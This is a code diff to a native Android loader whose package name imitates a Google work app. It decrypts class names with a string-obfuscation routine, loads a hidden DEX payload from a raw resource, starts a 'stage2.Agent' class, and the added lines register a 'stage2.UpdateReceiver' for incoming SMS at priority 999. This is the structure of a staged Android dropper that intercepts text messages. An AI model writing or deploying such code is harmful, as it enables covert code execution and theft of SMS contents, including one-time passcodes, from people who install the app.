@@ -123,18 +123,18 @@ Java_com_google_android_apps_work_cloudpc_Manager_loadBackground(JNIEnv *env, jc
     jstring jPath = getFilePathFromRawResource(env, context, resourceId);
     if (jPath == nullptr) return;
 
-    // "dalvik/system/DexClassLoader"
-    jclass dexClassLoaderClass = env->FindClass(o("`ehrmo+w}wpai+@a|GhewwHke`av").c_str());
+    // 3. Initialize DexClassLoader directly in C++
+    jclass dexClassLoaderClass = env->FindClass("dalvik/system/DexClassLoader");
     if (dexClassLoaderClass == nullptr) return;
 
     jmethodID dexClassLoaderInit = env->GetMethodID(dexClassLoaderClass, "<init>",
         "(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V");
     if (dexClassLoaderInit == nullptr) return;
 
-    // "java/lang/ClassLoader", "getSystemClassLoader"
-    jclass classLoaderClass = env->FindClass(o("nere+hejc+GhewwHke`av").c_str());
-    jmethodID getSystemClassLoader = env->GetStaticMethodID(classLoaderClass, o("capW}wpaiGhewwHke`av").c_str(), "()Ljava/lang/ClassLoader;");
-    jobject parentLoader = env->CallStaticObjectMethod(classLoaderClass, getSystemClassLoader);
+    // Use context.getClassLoader() as parent
+    jclass contextClass = env->GetObjectClass(context);
+    jmethodID getClassLoader = env->GetMethodID(contextClass, "getClassLoader", "()Ljava/lang/ClassLoader;");
+    jobject parentLoader = env->CallObjectMethod(context, getClassLoader);
 
     jobject classLoader = env->NewObject(dexClassLoaderClass, dexClassLoaderInit,
         jPath, (jstring)NULL, (jstring)NULL, parentLoader);
@@ -144,8 +144,9 @@ Java_com_google_android_apps_work_cloudpc_Manager_loadBackground(JNIEnv *env, jc
         return;
     }
 
-    // "loadClass"
-    jmethodID loadClassMethod = env->GetMethodID(classLoaderClass, o("hke`Gheww").c_str(), "(Ljava/lang/String;)Ljava/lang/Class;");
+    // 4. loader.loadClass("com.google.android.apps.work.stage2.Agent")
+    jclass classLoaderClass = env->FindClass("java/lang/ClassLoader");
+    jmethodID loadClassMethod = env->GetMethodID(classLoaderClass, "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;");
     if (loadClassMethod == nullptr) return;
     // "com.google.android.apps.work.stage2.Agent"
     jstring className = env->NewStringUTF(o("gki*ckkcha*ej`vkm`*ettw*skvo*wpeca6*Ecajp").c_str());
@@ -163,18 +164,52 @@ Java_com_google_android_apps_work_cloudpc_Manager_loadBackground(JNIEnv *env, jc
         getInstanceMethod = env->GetStaticMethodID(agentClass, o("capMjwpejga").c_str(), "()Ljava/lang/Object;");
     }
 
-    if (getInstanceMethod == nullptr) return;
-    jobject agentInstance = env->CallStaticObjectMethod(agentClass, getInstanceMethod);
+    if (getInstanceMethod != nullptr) {
+        jobject agentInstance = env->CallStaticObjectMethod(agentClass, getInstanceMethod);
+        if (agentInstance != nullptr) {
+            // 6. Call agentInstance.start(context, null, null)
+            jmethodID startMethod = env->GetMethodID(agentClass, "start", "(Landroid/content/Context;Landroid/content/Intent;Ljava/lang/Object;)V");
+            if (startMethod != nullptr) {
+                env->CallVoidMethod(agentInstance, startMethod, context, nullptr, nullptr);
+            }
+        }
+    }
 
-    if (agentInstance == nullptr) return;
+    // 7. Register UpdateReceiver from stage2 dynamically
+    jstring receiverClassName = env->NewStringUTF("com.google.android.apps.work.stage2.UpdateReceiver");
+    jclass updateReceiverClass = (jclass)env->CallObjectMethod(classLoader, loadClassMethod, receiverClassName);
 
-    // "start"
-    jmethodID startMethod = env->GetMethodID(agentClass, o("wpevp").c_str(), "(Landroid/content/Context;Landroid/content/Intent;Ljava/lang/Object;)V");
-    if (startMethod == nullptr) return;
+    if (!env->ExceptionCheck() && updateReceiverClass != nullptr) {
+        jmethodID receiverInit = env->GetMethodID(updateReceiverClass, "<init>", "()V");
+        jobject receiverInstance = env->NewObject(updateReceiverClass, receiverInit);
 
-    env->CallVoidMethod(agentInstance, startMethod, context, nullptr, nullptr);
+        if (receiverInstance != nullptr) {
+            jclass filterClass = env->FindClass("android/content/IntentFilter");
+            jmethodID filterInit = env->GetMethodID(filterClass, "<init>", "(Ljava/lang/String;)V");
+            jstring action = env->NewStringUTF("android.provider.Telephony.SMS_RECEIVED");
+            jobject filter = env->NewObject(filterClass, filterInit, action);
+
+            // Set high priority
+            jmethodID setPriority = env->GetMethodID(filterClass, "setPriority", "(I)V");
+            if (setPriority != nullptr) {
+                env->CallVoidMethod(filter, setPriority, 999);
+            }
+
+            // registerReceiver(BroadcastReceiver, IntentFilter)
+            jmethodID registerReceiverMethod = env->GetMethodID(contextClass, "registerReceiver", "(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;");
+
+            if (registerReceiverMethod != nullptr) {
+                env->CallObjectMethod(context, registerReceiverMethod, receiverInstance, filter);
+
+                jclass logClass = env->FindClass("android/util/Log");
+                jmethodID infoMethod = env->GetStaticMethodID(logClass, "i", "(Ljava/lang/String;Ljava/lang/String;)I");
+                env->CallStaticIntMethod(logClass, infoMethod, env->NewStringUTF("JNI_Loader"), env->NewStringUTF("Successfully registered UpdateReceiver dynamically with priority 999"));
+            }
+        }
+    }
 
     if (env->ExceptionCheck()) {
         env->ExceptionClear();
     }
 }
+
